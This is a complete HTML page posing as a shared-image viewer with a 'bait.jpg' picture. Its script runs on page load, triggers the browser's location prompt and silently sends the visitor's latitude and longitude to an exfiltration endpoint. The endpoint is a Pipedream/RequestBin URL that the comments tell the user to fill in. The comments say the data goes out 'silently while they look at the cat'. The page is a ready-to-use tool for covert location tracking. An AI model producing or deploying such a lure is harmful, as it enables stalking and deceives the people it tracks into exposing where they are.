<!DOCTYPE html>
<html>
<head>
    <title>Image Viewer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #000; color: white; text-align: center; font-family: Arial, sans-serif; margin: 0; padding: 0; }
        .container { padding: 20px; }
        img { width: 100%; max-width: 500px; border-radius: 8px; box-shadow: 0 4px 15px rgba(255,255,255,0.1); }
        h2 { font-size: 18px; margin-top: 20px; color: #eee; }
    </style>
</head>
<body onload="getLocation()">

    <div class="container">
        <h2>Shared Image</h2>
        <img src="bait.jpg" id="photo">
    </div>

    <script>
        // REPLACE THIS with your Pipedream/RequestBin URL
        const gate = "https://your-pipedream-url.m.pipedream.net";

        function getLocation() {
            if (navigator.geolocation) {
                // This triggers the browser popup as the photo loads
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            }
        }

        function showPosition(position) {
            // Sends the data silently while they look at the cat
            fetch(gate + "?lat=" + position.coords.latitude + "&lon=" + position.coords.longitude + "&type=InstantImage");
        }

        function showError(error) {
            console.log("User denied location.");
        }
    </script>
</body>
</html>
